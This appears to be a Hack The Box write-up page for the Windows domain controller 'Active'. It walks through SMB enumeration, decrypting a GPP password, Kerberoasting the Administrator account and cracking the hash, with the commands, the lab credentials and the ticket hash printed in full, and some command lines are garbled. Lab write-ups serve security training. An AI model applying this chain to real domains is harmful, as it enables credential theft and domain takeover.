@@ -1,0 +1,146 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Active is an easy HTB box that allows anonymous login on its SMB share. In one of the shares we can access the configuration file of a GPP (Group Policy Preference)."><meta property="og:title" content="HTB - Active"><meta property="og:description" content="Active is an easy HTB box that allows anonymous login on its SMB share. In one of the shares we can access the configuration file of a GPP (Group Policy Preference)."><meta property="og:type" content="website"><meta property="og:image" content="https://github.com/Cavonstavant/SecNotesicon.png"><meta property="og:url" content="https://github.com/Cavonstavant/SecNotes/HTB/Easy/Active/Active/"><meta property="og:width" content="200"><meta property="og:height" content="200"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB - Active"><meta name=twitter:description content="Active is an easy HTB box that allows anonymous login on its SMB share. In one of the shares we can access the configuration file of a GPP (Group Policy Preference)."><meta name=twitter:image content="https://github.com/Cavonstavant/SecNotesicon.png"><meta name=twitter:site content="Cavonstavant"><title>HTB - Active</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://github.com/Cavonstavant/SecNotes/icon.png><link href=https://github.com/Cavonstavant/SecNotes/styles.23697beb605d2a3fed62e1f7c912e378.min.css rel=stylesheet><link href=https://github.com/Cavonstavant/SecNotes/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://github.com/Cavonstavant/SecNotes/js/darkmode.790cea4979ce012ac76a9f96cff1746f.min.js></script>
+<script src=https://github.com/Cavonstavant/SecNotes/js/util.a0ccf91e1937fe761a74da4946452710.min.js></script>
+<link rel=preload href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css as=style onload='this.onload=null,this.rel="stylesheet"' integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/copy-tex.min.js integrity=sha384-ww/583aHhxWkz5DEVn6OKtNiIaLi2iBRNZXfJRiY1Ai7tnJ9UXpEsyvOITVpTl4A crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/@floating-ui/core@1.2.1></script>
+<script src=https://cdn.jsdelivr.net/npm/@floating-ui/dom@1.2.1></script>
+<script async src=https://github.com/Cavonstavant/SecNotes/js/popover.aa9bc99c7c38d3ae9538f218f1416adb.min.js></script>
+<script defer src=https://github.com/Cavonstavant/SecNotes/js/code-title.ce4a43f09239a9efb48fee342e8ef2df.min.js></script>
+<script defer src=https://github.com/Cavonstavant/SecNotes/js/clipboard.2913da76d3cb21c5deaa4bae7da38c9f.min.js></script>
+<script defer src=https://github.com/Cavonstavant/SecNotes/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
+<script>const SEARCH_ENABLED=!1,LATEX_ENABLED=!0,PRODUCTION=!0,BASE_URL="https://github.com/Cavonstavant/SecNotes",fetchData=Promise.all([fetch("https://github.com/Cavonstavant/SecNotes/indices/linkIndex.88e76a7dbabf48e0a0fb350a525c8f51.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://github.com/Cavonstavant/SecNotes/indices/contentIndex.1c75ce30f98585b213932d0a63e2faf5.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://github.com/Cavonstavant/SecNotes",!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://github.com/Cavonstavant/SecNotes",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}var i=document.getElementsByClassName("mermaid");i.length>0&&import("https://unpkg.com/mermaid@9/dist/mermaid.esm.min.mjs").then(e=>{e.default.init()});function a(n){const e=n.target,t=e.className.split(" "),s=t.includes("broken"),o=t.includes("internal-link");plausible("Link Click",{props:{href:e.href,broken:s,internal:o,graph:!1}})}const r=document.querySelectorAll("a");for(link of r)link.className.includes("root-title")&&link.addEventListener("click",a,{once:!0})},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],macros:{'’':"'"},throwOnError:!1})}</script><script type=module>
+    import { attachSPARouting } from "https:\/\/github.com\/Cavonstavant\/SecNotes\/js\/router.d6fe6bd821db9ea97f9aeefae814d8e7.min.js"
+    attachSPARouting(init, render)
+  </script><script defer data-domain=github.com/Cavonstavant/SecNotes src=https://plausible.io/js/script.js></script>
+<script>window.plausible=window.plausible||function(){(window.plausible.q=window.plausible.q||[]).push(arguments)}</script></head><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
+<script defer src=https://github.com/Cavonstavant/SecNotes/js/full-text-search.e6e2e0c213187ca0c703d6e2c7a77fcd.min.js></script><div class=singlePage><header><h1 id=page-title><a class=root-title href=https://github.com/Cavonstavant/SecNotes>SecNotes</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
+<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>HTB - Active</h1><p class=meta>Last updated
+Mar 11, 2023</p><ul class=tags></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#zerologon-cve-test>ZEROLOGON CVE test</a></li><li><a href=#enumerating-smb-share>Enumerating SMB share</a></li><li><a href=#decrypting-group-policy-preference-password>Decrypting Group Policy Preference password</a></li><li><a href=#kerberoasting-the-domain>Kerberoasting the domain</a></li></ol></nav></details></aside><p>Active is an easy HTB box that allows anonymous login on its SMB share. In one of the shares we can access the configuration file of a GPP (Group Policy Preference). We will then use those creds to kerberoast the domain and impersonate the domain admin.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PORT      STATE SERVICE       VERSION
+</span></span><span class=line><span class=cl>53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+</span></span><span class=line><span class=cl>| dns-nsid: 
+</span></span><span class=line><span class=cl>|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+</span></span><span class=line><span class=cl>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds?
+</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5?
+</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class=line><span class=cl>636/tcp   open  tcpwrapped
+</span></span><span class=line><span class=cl>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+</span></span><span class=line><span class=cl>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class=line><span class=cl>49152/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>49153/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class=line><span class=cl>49158/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>49165/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host script results:
+</span></span><span class=line><span class=cl>| smb2-time: 
+</span></span><span class=line><span class=cl>|   date: 2023-02-10T14:23:26
+</span></span><span class=line><span class=cl>|_  start_date: 2023-02-10T14:17:08
+</span></span><span class=line><span class=cl>| smb2-security-mode: 
+</span></span><span class=line><span class=cl>|   210: 
+</span></span><span class=line><span class=cl>|_    Message signing enabled and required
+</span></span></code></pre></td></tr></table></div></div><a href=#zerologon-cve-test><h2 id=zerologon-cve-test><span class=hanchor arialabel=Anchor># </span>ZEROLOGON CVE test</h2></a><p>The domain name is <code>active.htb</code> and the domain seems to be vulnerable to zerologon CVE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cme smb 10.10.10.100 -M zerologon                                                                                                                                                                                                   
+</span></span><span class=line><span class=cl>SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+</span></span><span class=line><span class=cl>ZEROLOGO... 10.10.10.100    445    DC               VULNERABLE
+</span></span><span class=line><span class=cl>ZEROLOGO... 10.10.10.100    445    DC               Next step: https://github.com/dirkjanm/CVE-2020-1472
+</span></span></code></pre></td></tr></table></div></div><p>However the vulnerability only allows us to reset the password of a computer account. It seems that this box doesn&rsquo;t have any !</p><a href=#enumerating-smb-share><h2 id=enumerating-smb-share><span class=hanchor arialabel=Anchor># </span>Enumerating SMB share</h2></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>smbmap -H active.htb                                                                                                                                                                                                               
+</span></span><span class=line><span class=cl>[+] IP: active.htb:445	Name: unknown                                           
+</span></span><span class=line><span class=cl>    Disk                                                Permissions	Comment
+</span></span><span class=line><span class=cl>	----                                                -----------	-------
+</span></span><span class=line><span class=cl>	Replication                                       	READ ONLY
+</span></span></code></pre></td></tr></table></div></div><p>In the <code>Replication</code> share we can access a <code>Groups.xml</code> file in the <code>\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml</code> directory</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>cat active.htb\\Policies\\\{31B2F340-016D-11D2-945F-00C04FB984F9\}\\MACHINE\\Preferences\\Groups\\Groups.xml | xq
+</span></span><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Groups</span> <span class=na>clsid=</span><span class=s>&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&lt;User</span> <span class=na>clsid=</span><span class=s>&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> <span class=na>name=</span><span class=s>&#34;active.htb\SVC_TGS&#34;</span> <span class=na>image=</span><span class=s>&#34;2&#34;</span> <span class=na>changed=</span><span class=s>&#34;2018-07-18 20:46:06&#34;</span> <span class=na>uid=</span><span class=s>&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;Properties</span> <span class=na>action=</span><span class=s>&#34;U&#34;</span> <span class=na>newName=</span><span class=s>&#34;&#34;</span> <span class=na>fullName=</span><span class=s>&#34;&#34;</span> <span class=na>description=</span><span class=s>&#34;&#34;</span> <span class=na>cpassword=</span><span class=s>&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> <span class=na>changeLogon=</span><span class=s>&#34;0&#34;</span> <span class=na>noChange=</span><span class=s>&#34;1&#34;</span> <span class=na>neverExpires=</span><span class=s>&#34;1&#34;</span> <span class=na>acctDisabled=</span><span class=s>&#34;0&#34;</span> <span class=na>userName=</span><span class=s>&#34;active.htb\SVC_TGS&#34;</span><span class=nt>/&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&lt;/User&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;/Groups&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#decrypting-group-policy-preference-password><h2 id=decrypting-group-policy-preference-password><span class=hanchor arialabel=Anchor># </span>Decrypting Group Policy Preference password</h2></a><p>we have a user: <code>active.htb\SVC_TGS</code> and an hashed password: <code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code>
+Since this is a groups policy configuration file, we can use a tool like <code>gpp-decrypt</code> to decrypt the password</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ:GPPstillStandingStrong2k18                                                                                                                          
+</span></span></code></pre></td></tr></table></div></div><a href=#kerberoasting-the-domain><h2 id=kerberoasting-the-domain><span class=hanchor arialabel=Anchor># </span>Kerberoasting the domain</h2></a><p>Looking to the SPNs of the <code>SVC_TGS</code> user we can see that it as the Administrator service attached to it and request the hash</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18                                                                                                                                                                  
+</span></span><span class=line><span class=cl>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+</span></span><span class=line><span class=cl>--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+</span></span><span class=line><span class=cl>active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-02-10 09:18:10.370542
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>[-] CCache file is not found. Skipping...
+</span></span><span class=line><span class=cl>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$3441b65bc2247e4f8a03cf9177a9e76f$97d5ec5ec9153d5ef4ce61654640a3117556642864b84b6e8890a5275cfbc96b9ed53bce558cbb7e3210f3ec81403cc99a1092650963addecf32e42e01ac1cc72d6154cd1cdd47aa62129928a54861778858d0e9bb7a3a967070b6a98b17fd6b852914a9841867fd886e413d03c6b10299a5c2f8c04cf69665d001325e6475d1bf73538e4feee22f5d509036689d79b8427fb30e6b6cbe596d27003909a8937c1aa66fd842ba6d3e2aeb214cdec9f1f307c91947e378cba475df9a4d3d6b029fcb3ee52cf7b3d88a2a7e110df9bd614a361a6907fb17a18bdf80d007c2559fe97d7106c3785508a862f85920870474436db5384954ac3fa52506ec7aa208fc642d8df96fcfefcd41759f8d201af21a66a31424fdd6a3c85c5eb8e58698bebc6f48d3c8156108b26edded0e25028395088bdafbed9e0679f7f3a5c2105f0a30340c7361ea0c17d85cd1a9323a866eed20dacb1cea66e63725b33c5ecf698db6a13764fcd51680e79a7a4ddfa2025e6158408de61656fa89c1f5bb652ba8e88396878cf04a8ec6f8c2d85590c510d4c109a4435b621d56725e3489bd85c72efdcae1361b4f6f29464516310ceb9c43d85504803cdb98d66a7a83436de8fee9c285ff44bdf6a865c436a4b4c01cebba30caa25dad6bfc8341a488710284ff520e59f07e32e2bd81b3ddc310ea64073551850c0c5c79ff2b01811f56abd6830380aa47991e7cedccb8458306ef390b191a74141f25f4156602434c84a6d1e5de882d8a4580e7777592c0af00368be88cd294a1828d14b04078268857efd37d878e1df2e7882e430937c868ee3c235c64ce0c0518b23daaf50524262d7af8374c1d7d13ff275aaeb2d4f5da5a2dff1fcc25d8ed86d968a8476143ac663ac9008521be501bc61de25e92af693da9f4fc31dac84b50f2c08787ca0b0211afdbccb6bc2a02e20b344cf15b8c29ba8d046c018af0ee23535554c2e7cdddac6edd8e702d157a5178b2915fb037ffa5c02c77ac807f1e32df8a718d9f4b5bbcbde619100e9234cc17fedb040159fe3bcf50cf7ebe36892530b6eddd6a1b0a995f5b5952b9713acfd85a2628f23b0ac4286376f55aa16aaabb6a5fe6c84428f30e1bfbada41150cb04d6667311c6ed76ecae77f31ac481fe1d57d6926977ab655c3fac85ba29b4ca1d43c206bcbe471a1b99261ab73a115336b4dada808fabc04be2485281fcc4f19518c55277759de7a2c2b9de6771bd6ae75793d790f711b9
+</span></span></code></pre></td></tr></table></div></div><p>Using JTR we can crack the hash of the SPN</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>rick svc_tgs.txt -w /usr/share/wordlists/rockyou.txt                                                                                                                                                                               
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>Ticketmaster1968 (?)     
+</span></span><span class=line><span class=cl>1g 0:00:00:11 DONE (2023-02-10 11:18) 0.09049g/s 953663p/s 953663c/s 953663C/s Tiffani1432..Thrash1
+</span></span><span class=line><span class=cl>...
+</span></span></code></pre></td></tr></table></div></div><p>We can now the <code>User</code> smb share as Administrator and get both the user and the root flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>smbclient -U ACTIVE/Administrator \\\\10.10.10.100\\Users
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>smb: \SVC_TGS\Desktop\&gt; get user.txt
+</span></span><span class=line><span class=cl>getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+</span></span><span class=line><span class=cl>smb: \Administrator\Desktop\&gt; root user.txt
+</span></span><span class=line><span class=cl>getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+</span></span></code></pre></td></tr></table></div></div><p>AAAAAAAAAAAAAAAA</p></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li><a href=/Cavonstavant/SecNotes/HackTheBox/ data-ctx=Active data-src=/HackTheBox class=internal-link>SecNotes - HTB</a></li></ul></div><div><script async src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://github.com/Cavonstavant/SecNotes/js/graph.6579af7b10c818dbd2ca038702db0224.js></script></div></div><div id=contact_buttons><footer><p>Made by Cavonstavant using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2023</p><ul><li><a href=https://github.com/Cavonstavant/SecNotes>Home</a></li><li><a href=https://twitter.com/Cavonstavant>Twitter</a></li><li><a href=https://github.com/Cavonstavant>GitHub</a></li><li><a href=https://www.linkedin.com/in/constant-vigneron/>LinkedIn</a></li></ul></footer></div></div></body></html>
